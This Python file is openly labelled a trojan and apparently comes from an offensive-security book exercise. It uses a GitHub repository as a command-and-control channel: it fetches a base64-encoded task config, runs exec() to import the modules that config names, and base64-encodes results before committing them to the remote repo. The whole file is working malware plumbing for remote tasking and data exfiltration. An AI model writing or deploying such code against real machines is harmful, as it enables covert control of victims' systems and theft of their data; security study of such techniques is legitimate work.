import json
import os
import sys
import base64
import time
import random
import threading
import queue
from github3 import login

trojan_id = "abc"

trojan_config   = f"{trojan_id}.json"
data_path       = f"data/{trojan_id}/"
trojan_modules  = []
configured      = False
task_queue      = queue.Queue()


def connectToGithub():
    # token = os.environ.get("GITHUB_TOKEN")
    # if not token:
    #     raise RuntimeError("GITHUB_TOKEN env variable not set")
    
    token = "PUT_YOUR_GITHUB_TOKEN"
    gh = login(token=token)
    repo = gh.repository("username", "chapter7")
    branch = repo.branch("master")
    return gh, repo, branch


def getFileContents(filepath):
    gh, repo, branch = connectToGithub()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[*] Found file: {filepath}")
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
        
    return None

def getTrojanConfig():
    global configured
    configJson  = getFileContents(trojan_config)
    decoded     = base64.b64decode(configJson).decode()
    config      = json.loads(decoded)
    configured  = True

    for task in config:
        if task['module'] not in sys.modules:
            exec(f"import {task['module']}")

    return config

def storeModuleResult(data):
    gh, repo, branch = connectToGithub()
    remotePath = f"data/{trojan_id}/{random.randint(1000, 100000)}.data"
    
    if isinstance(data, str):
        data = data.encode()

    encoded = base64.b64encode(data).decode()
    
    repo.create_file(
        remotePath,
        "Commit message",
        encoded
    )

    return

